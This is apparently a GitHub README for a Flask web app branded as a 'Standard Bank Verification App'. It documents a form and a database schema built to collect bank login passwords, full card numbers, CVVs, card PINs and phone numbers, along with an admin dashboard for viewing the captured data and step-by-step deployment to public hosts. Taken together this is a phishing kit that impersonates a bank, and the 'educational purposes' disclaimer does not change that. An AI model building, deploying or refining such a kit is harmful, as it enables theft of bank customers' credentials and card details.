# 🏦 Standard Bank Verification App

[![Python](https://img.shields.io/badge/Python-3.11+-blue.svg)](https://python.org)
[![Flask](https://img.shields.io/badge/Flask-2.3.3-green.svg)](https://flask.palletsprojects.com/)
[![License](https://img.shields.io/badge/License-MIT-yellow.svg)](LICENSE)
[![Docker](https://img.shields.io/badge/Docker-Ready-blue.svg)](Dockerfile)

A complete Flask web application with admin interface for managing account verification form submissions.

## ✨ Features

- **📝 User Form**: Account verification form that collects user credentials and card details
- **👨‍💼 Admin Interface**: Secure dashboard to view all submitted data
- **🔒 Authentication**: Password-protected admin access with bcrypt hashing
- **💾 Database**: SQLite database with SQLAlchemy ORM
- **🔄 Real-time Updates**: Auto-refreshing admin dashboard
- **📱 Mobile Responsive**: Works on all device sizes
- **🐳 Docker Ready**: Containerized for easy deployment
- **🛡️ Security**: Input validation, session management, and secure password hashing

## 🚀 Quick Start

### Method 1: Local Development

#### 1. Clone the Repository
```bash
git clone https://github.com/yourusername/stdbnk.git
cd stdbnk
```

#### 2. Install Python Dependencies
```bash
pip install -r requirements.txt
```

#### 3. Configure Environment (Optional)
```bash
cp env.example .env
# Edit .env with your settings
```

#### 4. Start the Flask Server
```bash
python app.py
```

### Method 2: Docker Deployment

#### Using Docker Compose (Recommended)
```bash
git clone https://github.com/yourusername/stdbnk.git
cd stdbnk
docker-compose up -d
```

#### Using Docker
```bash
git clone https://github.com/yourusername/stdbnk.git
cd stdbnk
docker build -t stdbnk-app .
docker run -p 3000:3000 stdbnk-app
```

### 🌐 Access the Application

- **Main Form**: http://localhost:3000
- **Admin Login**: http://localhost:3000/admin/login
- **Admin Dashboard**: http://localhost:3000/admin/dashboard (after login)

## 🔑 Default Admin Credentials

- **Username**: `admin`
- **Password**: `password`

> ⚠️ **Security Warning**: Change the default admin password immediately in production!

## 🌐 Deployment Options

### GitHub Pages (Static hosting - not suitable for this app)
This app requires a Python backend, so GitHub Pages won't work. Use the options below instead.

## 🚀 Deploy to Render (Recommended)

Render offers excellent free tier hosting with automatic deployments from GitHub.

### One-Click Deploy
[![Deploy to Render](https://render.com/images/deploy-to-render-button.svg)](https://render.com/deploy?repo=https://github.com/VarsityPlug0/stdbnk)

### Manual Deployment Steps

#### Step 1: Create Render Account
1. Go to [render.com](https://render.com)
2. Sign up with your GitHub account
3. Authorize Render to access your repositories

#### Step 2: Create Web Service
1. Click "New +" → "Web Service"
2. Select your `stdbnk` repository
3. Configure the service:
   - **Name**: `stdbnk-app` (or your preferred name)
   - **Region**: Choose closest to your users
   - **Branch**: `main`
   - **Runtime**: `Python 3`
   - **Build Command**: `pip install -r requirements.txt`
   - **Start Command**: `python app.py`

#### Step 3: Environment Variables
Add these environment variables in Render dashboard:
```bash
SECRET_KEY=your-super-secret-key-here
DEBUG=False
ADMIN_USERNAME=admin
ADMIN_PASSWORD=your-secure-admin-password
DATABASE_URL=sqlite:///database.db
```

#### Step 4: Deploy
1. Click "Create Web Service"
2. Wait for build to complete (2-3 minutes)
3. Your app will be available at `https://your-app-name.onrender.com`

### 🔄 Automatic Deployments
Once set up, Render automatically deploys whenever you push to your GitHub repository!

### Heroku Deployment
1. Create a `Procfile`:
```
web: python app.py
```

2. Push to Heroku:
```bash
heroku create your-app-name
git push heroku main
```

### Render Deployment (Recommended) 🌟
1. **Sign up** at [render.com](https://render.com)
2. **Connect GitHub**: Link your GitHub account
3. **Create Web Service**: 
   - Select your `stdbnk` repository
   - Runtime: `Python 3`
   - Build Command: `pip install -r requirements.txt`
   - Start Command: `python app.py`
4. **Set Environment Variables**:
   ```
   SECRET_KEY=your-generated-secret-key
   DEBUG=False
   ADMIN_USERNAME=admin
   ADMIN_PASSWORD=your-secure-password
   ```
5. **Deploy**: Click "Create Web Service"

> ✨ **Auto-deploy**: Render automatically deploys when you push to GitHub!

### Railway Deployment
1. Connect your GitHub repository to Railway
2. Set environment variables in Railway dashboard
3. Deploy automatically on push

### DigitalOcean App Platform
1. Connect your GitHub repository
2. Configure environment variables
3. Deploy with one click

### VPS/Server Deployment
```bash
# Install dependencies
sudo apt update
sudo apt install python3 python3-pip nginx

# Clone and setup
git clone https://github.com/yourusername/stdbnk.git
cd stdbnk
pip3 install -r requirements.txt

# Run with Gunicorn
pip3 install gunicorn
gunicorn -w 4 -b 0.0.0.0:3000 app:app
```

## 📁 Project Structure

```
stdbnk/
├── 📄 app.py                    # Main Flask application with all backend logic
├── 📋 requirements.txt          # Python dependencies
├── 🐳 Dockerfile               # Docker container configuration
├── 🐳 docker-compose.yml       # Docker Compose configuration
├── 🚫 .gitignore               # Git ignore rules
├── 📋 env.example              # Environment variables template
├── 📜 LICENSE                  # MIT license
├── 💾 database.db              # SQLite database (created automatically)
├── 📁 public/                  # Frontend files
│   ├── 🌐 index.html           # Main verification form
│   ├── 🔑 admin-login.html     # Admin login page
│   └── 📊 admin-dashboard.html # Admin dashboard
└── 📖 README.md               # This documentation
```

## API Endpoints

### Public Endpoints
- `GET /` - Main verification form
- `POST /api/submit` - Submit verification data

### Admin Endpoints
- `GET /admin/login` - Admin login page
- `POST /admin/login` - Admin authentication
- `GET /admin/dashboard` - Admin dashboard (protected)
- `GET /api/admin/submissions` - Get all submissions (protected)
- `POST /admin/logout` - Admin logout

## Database Schema

### submissions table
- `id` - Primary key
- `fullname` - Username
- `password` - User password
- `card_number` - 16-digit card number
- `expiry_date` - Card expiry (MM/YY)
- `cvv` - 3-digit CVV
- `card_pin` - 5-digit card PIN
- `contact_number` - Contact number
- `submitted_at` - Timestamp

### admins table
- `id` - Primary key
- `username` - Admin username
- `password_hash` - Hashed password

## Security Features

- Password hashing with bcrypt
- Session-based authentication
- SQL injection protection with prepared statements
- XSS protection with HTML escaping
- Input validation and sanitization

## Code Explanation

### app.py
The main Flask application contains:
- **Flask setup**: Configures the web server and SQLAlchemy ORM
- **Database models**: Defines Submission and Admin models with SQLAlchemy
- **Authentication**: Handles admin login/logout with Flask sessions and bcrypt
- **API routes**: Processes form submissions and admin requests
- **Security**: Implements bcrypt password hashing and input validation

### Frontend Files
- **index.html**: Main form with JavaScript for submission handling
- **admin-login.html**: Login interface with form validation
- **admin-dashboard.html**: Dashboard with data table and statistics

## Development Notes

- Server runs on port 3000 by default
- Database file is created automatically on first run
- Sessions are stored in memory (consider Redis for production)
- All sensitive data is highlighted in the admin interface
- Auto-refresh functionality updates the dashboard every 30 seconds

## 🛡️ Security Considerations

### For Production Deployment:

1. **🔐 Change Default Credentials**
   ```bash
   # Set in environment variables
   export ADMIN_USERNAME=your-admin-username
   export ADMIN_PASSWORD=your-secure-password
   ```

2. **🔒 Enable HTTPS**
   - Use SSL certificates (Let's Encrypt recommended)
   - Set `SESSION_COOKIE_SECURE=True` in production

3. **🔑 Secure Configuration**
   ```bash
   # Use strong secret key
   export SECRET_KEY=$(python -c 'import secrets; print(secrets.token_urlsafe(32))')
   ```

4. **💾 Production Database**
   - Consider PostgreSQL or MySQL for production
   - Regular database backups

5. **🚫 Rate Limiting**
   - Implement with Flask-Limiter
   - Protect against brute force attacks

6. **📊 Monitoring & Logging**
   - Set up application logging
   - Monitor for security events

7. **🐳 Container Security**
   - Use non-root user in Docker
   - Keep base images updated

## 🤝 Contributing

1. Fork the repository
2. Create a feature branch: `git checkout -b feature-name`
3. Make your changes and commit: `git commit -m 'Add some feature'`
4. Push to the branch: `git push origin feature-name`
5. Submit a pull request

## 📄 License

This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.

## ⚠️ Disclaimer

This application is for educational purposes only. Ensure proper security measures are implemented before using in any production environment where sensitive data is handled.
